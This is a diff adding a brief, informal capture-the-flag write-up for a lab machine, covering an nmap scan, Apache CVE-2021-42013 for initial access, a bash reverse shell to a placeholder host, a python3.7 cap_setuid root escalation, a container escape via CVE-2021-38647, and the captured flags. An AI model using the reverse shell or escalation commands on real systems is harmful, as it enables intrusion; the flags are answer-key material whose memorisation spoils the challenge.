@@ -1,3 +1,4 @@
+Start from nmapscan
 ```shell
 Nmap scan report for 10.10.21.51
 Host is up (0.12s latency).
@@ -29,4 +30,38 @@ HOP RTT       ADDRESS
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 3574.58 seconds
+```
+find apache version and this version has got CVE-2021-42013 - RCE on apache, use exploit and take first shell, we must stabilization this, use 
+```shell
+bash -c "bash -i >& /dev/tcp/ip/port 0>&1"
+```
+for Reverse shell, after use:
+```shell
+stty raw -echo; fg
+```
+after push `Enter` and we have our good shell
+next stem get a user flag 
+i find root from capabilites
+```shell
+/usr/bin/python3.7 = cap_setuid+ep
+```
+use
+```shell
+python3.7 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+```
+and we take `uid=0(root)`
+we have a root what strange but, okay take user flag
+```shell
+cat /root/user.txt
+THM{eacffefe1d2aafcc15e70dc2f07f7ac1}
+```
+after i dont kniw what to do next and i thin what if im in docker and i find
+```shell
+root@4a70924bafa0:/root# ifconfig eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST> mtu 1500 inet 172.17.0.2 netmask 255.255.0.0 broadcast 172.17.255.255 ether 02:42:ac:11:00:02 txqueuelen 0 (Ethernet) RX packets 966 bytes 65304 (63.7 KiB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 602 bytes 106152 (103.6 KiB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 lo: flags=73<UP,LOOPBACK,RUNNING> mtu 65536 inet 127.0.0.1 netmask 255.0.0.0 loop txqueuelen 1000 (Local Loopback) RX packets 0 bytes 0 (0.0 B) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 0 bytes 0 (0.0 B) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0
+```
+and we see what we in container, after find open port in main machine its `5986`
+and we have RCE for this port because its open, use exploit for this CVE-2021-38647
+and take a flag:
+```shell
+THM{7f147ef1f36da9ae29529890a1b6011f}
 ```
